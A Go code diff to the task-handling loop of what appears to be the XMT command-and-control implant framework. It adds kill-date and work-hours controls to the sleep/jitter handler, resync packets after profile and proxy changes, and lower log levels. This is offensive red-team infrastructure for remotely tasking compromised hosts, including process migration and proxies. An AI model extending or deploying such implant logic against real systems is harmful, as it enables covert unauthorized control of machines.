@@ -24,6 +24,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/cmd"
@@ -52,7 +53,7 @@ var (
 	_ runnable = (*cmd.Assembly)(nil)
 )
 
-var errNoTask = xerr.Sub(fourOhFour, 0xFE)
+var errInvalidTask = xerr.Sub(fourOhFour, 0xFE)
 
 func muxHandleSpawnAsync(s *Session, n *com.Packet) {
 	if bugtrack.Enabled {
@@ -71,11 +72,11 @@ func muxHandleScriptAsync(s *Session, n *com.Packet) {
 	w = nil
 }
 func defaultClientMux(s *Session, n *com.Packet) bool {
-	if n.ID < task.MvRefresh || n.ID == RvResult || n.ID == RvMigrate {
+	if n.ID < task.MvRefresh || n.ID == RvResult {
 		return false
 	}
 	if cout.Enabled {
-		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
+		s.log.Debug(`[%s/MuX] Received packet %s.`, s.ID, n)
 	}
 	switch {
 	case n.ID == task.MvSpawn:
@@ -126,14 +127,14 @@ func muxHandleExternalAsync(s *Session, n *com.Packet) {
 		return
 	}
 	if cout.Enabled {
-		s.log.Info("[%s/MuX] Starting async Task for Job %d.", s.ID, n.Job)
+		s.log.Trace("[%s/MuX] Starting async Task for Job %d.", s.ID, n.Job)
 	}
 	muxHandleSend(s, n, w, t(s.ctx, n, w))
 	t = nil
 }
 func muxHandleScript(s *Session, n, w *com.Packet) error {
 	if cout.Enabled {
-		s.log.Info("[%s/MuX] Starting Script Task for Job %d.", s.ID, n.Job)
+		s.log.Trace("[%s/MuX] Starting Script Task for Job %d.", s.ID, n.Job)
 	}
 	o, err := n.Uint8()
 	if err != nil {
@@ -144,6 +145,7 @@ func muxHandleScript(s *Session, n, w *com.Packet) error {
 		e = o&flagStopOnError != 0
 		r = o&flagNoReturnOutput == 0
 		d []byte
+		z uint8
 		v com.Packet
 		t task.Tasker
 	)
@@ -161,6 +163,9 @@ loop:
 		w.WriteUint8(v.ID)
 		switch d, err = nil, nil; {
 		case v.ID == task.MvScript:
+			if cout.Enabled {
+				s.log.Warning("[%s/MuX] Attempted to run a Script packed in Script!", s.ID)
+			}
 			if e {
 				err = syscall.EINVAL
 				break loop
@@ -171,11 +176,16 @@ loop:
 		case v.ID == task.MvSpawn:
 			err = muxHandleSpawnSync(s, &v, b)
 		case v.ID < RvResult:
-			err = muxHandleInternal(s, &v, b)
+			switch err = muxHandleInternal(s, &v, b); {
+			case err == nil && v.ID == task.MvRefresh:
+				z = infoRefresh
+			case err == nil && (v.ID == task.MvTime || v.ID == task.MvProfile):
+				z = infoSync
+			}
 		default:
 			if t = task.Mappings[v.ID]; t == nil {
 				if e {
-					err = errNoTask
+					err = errInvalidTask
 					break loop
 				}
 				w.WriteBool(false)
@@ -201,7 +211,16 @@ loop:
 	}
 	b.Clear()
 	v.Clear()
-	n.Clear()
+	// Update the server when a MvTime/MvRefresh/MvProfile was in a script.
+	// This packet is a special type that is associated with a Job. If the Job
+	// does not exist, the Packet is disregarded.
+	if n.Clear(); z > 0 {
+		s.writeDeviceInfo(infoSync, w)
+		q := &com.Packet{ID: SvResync, Job: n.Job, Device: s.ID}
+		q.WriteUint8(z)
+		s.writeDeviceInfo(z, q)
+		s.queue(q)
+	}
 	if buffers.Put(b); err == io.EOF {
 		return nil
 	}
@@ -215,7 +234,7 @@ func muxHandleSend(s *Session, n, w *com.Packet, e error) {
 			s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, e.Error())
 		}
 	} else if cout.Enabled {
-		s.log.Debug("[%s/MuX] Task with Job %d completed!", s.ID, n.Job)
+		s.log.Trace("[%s/MuX] Task with Job %d completed!", s.ID, n.Job)
 	}
 	// NOTE(dij): For now, we're gonna let these block.
 	//            I'll track and see if they should throw errors instead.
@@ -277,34 +296,64 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 		}
 		return nil
 	case task.MvTime:
-		j, err := n.Int8()
+		t, err := n.Uint8()
 		if err != nil {
 			return err
 		}
-		d, err := n.Int64()
-		if err != nil {
-			return err
+		switch t {
+		case timeSleepJitter:
+			j, err1 := n.Int8()
+			if err1 != nil {
+				return err1
+			}
+			d, err1 := n.Int64()
+			if err1 != nil {
+				return err1
+			}
+			switch {
+			case j == -1:
+				// NOTE(dij): This handles a special case where Script packets are
+				//            used to set the sleep/jitter since they don't have access
+				//            to the previous values.
+				//            A packet with a '-1' Jitter value will be ignored.
+			case j > 100:
+				s.jitter = 100
+			case j < 0:
+				s.jitter = 0
+			default:
+				s.jitter = uint8(j)
+			}
+			if d > 0 {
+				// NOTE(dij): Ditto here, except for sleep. Anything less than zero
+				//            will work.
+				s.sleep = time.Duration(d)
+			}
+		case timeKillDate:
+			u, err1 := n.Int64()
+			if err1 != nil {
+				return err1
+			}
+			if u == 0 {
+				s.kill = nil
+			} else {
+				d := time.Unix(u, 0)
+				s.kill = &d
+			}
+		case timeWorkHours:
+			var w cfg.WorkHours
+			if err = w.UnmarshalStream(n); err != nil {
+				return err
+			}
+			if s.work != nil {
+				s.Wake()
+			}
+			if w.Empty() {
+				s.work = nil
+			} else {
+				s.work = &w
+			}
 		}
-		switch {
-		case j == -1:
-			// NOTE(dij): This handles a special case where Script packets are
-			//            used to set the sleep/jitter since they don't have access
-			//            to the previous values.
-			//            A packet with a '-1' Jitter value will be ignored.
-		case j > 100:
-			s.jitter = 100
-		case j < 0:
-			s.jitter = 0
-		default:
-			s.jitter = uint8(j)
-		}
-		if d > 0 {
-			// NOTE(dij): Ditto here, except for sleep. Anything less than zero
-			//            will work.
-			s.sleep = time.Duration(d)
-		}
-		w.WriteUint8(s.jitter)
-		w.WriteUint64(uint64(s.sleep))
+		s.writeDeviceInfo(infoSync, w)
 		return nil
 	case task.MvProxy:
 		var (
@@ -319,12 +368,13 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 		}
 		if r == 0 {
 			if i := s.Proxy(v); i != nil {
-				return i.Close()
+				if err := i.Close(); err != nil {
+					return err
+				}
+				s.writeDeviceInfo(infoProxy, w)
+				return nil
 			}
 			return os.ErrNotExist
-		}
-		if ProfileParser == nil {
-			return xerr.Sub("no Profile parser loaded", 0x44)
 		}
 		var (
 			b string
@@ -336,18 +386,25 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 		if err := n.ReadBytes(&k); err != nil {
 			return err
 		}
-		p, err := ProfileParser(k)
+		p, err := parseProfile(k)
 		if err != nil {
 			return xerr.Wrap("parse Profile", err)
 		}
 		if r == 1 {
 			if i := s.Proxy(v); i != nil {
-				return i.Replace(b, p)
+				if err = i.Replace(b, p); err != nil {
+					return err
+				}
+				s.writeDeviceInfo(infoProxy, w)
+				return nil
 			}
 			return os.ErrNotExist
 		}
-		_, err = s.NewProxy(v, b, p)
-		return err
+		if _, err = s.NewProxy(v, b, p); err != nil {
+			return err
+		}
+		s.writeDeviceInfo(infoProxy, w)
+		return nil
 	case task.MvMounts:
 		m, err := device.Mounts()
 		if err != nil {
@@ -374,7 +431,7 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 		if err != nil {
 			return err
 		}
-		if _, err = s.MigrateProfile(k, i, p, n.Job, 0, e); err != nil {
+		if _, err = s.MigrateProfile(k, i, p, n.Job, spawnDefaultTime, e); err != nil {
 			if len(v) > 0 {
 				os.Remove(v)
 			}
@@ -389,23 +446,21 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 			return err
 		}
 		s.Device = local.Device.Machine
-		s.Device.MarshalStream(w)
+		s.writeDeviceInfo(infoRefresh, w)
 		return nil
 	case task.MvProfile:
-		if ProfileParser == nil {
-			return xerr.Sub("no Profile parser loaded", 0x44)
-		}
 		b, err := n.Bytes()
 		if err != nil {
 			return err
 		}
-		p, err := ProfileParser(b)
+		p, err := parseProfile(b)
 		if err != nil {
 			return xerr.Wrap("parse Profile", err)
 		}
 		if s.swap = p; cout.Enabled {
-			s.log.Info("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
+			s.log.Debug("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
 		}
+		s.writeDeviceInfo(infoSync, w)
 		return nil
 	case task.MvProcList:
 		e, err := cmd.Processes()
@@ -429,7 +484,7 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 		return nil
 	}
 	// Shouldn't happen
-	return errNoTask
+	return errInvalidTask
 }
 func muxHandleSpawnSync(s *Session, n *com.Packet, w data.Writer) error {
 	if cout.Enabled {
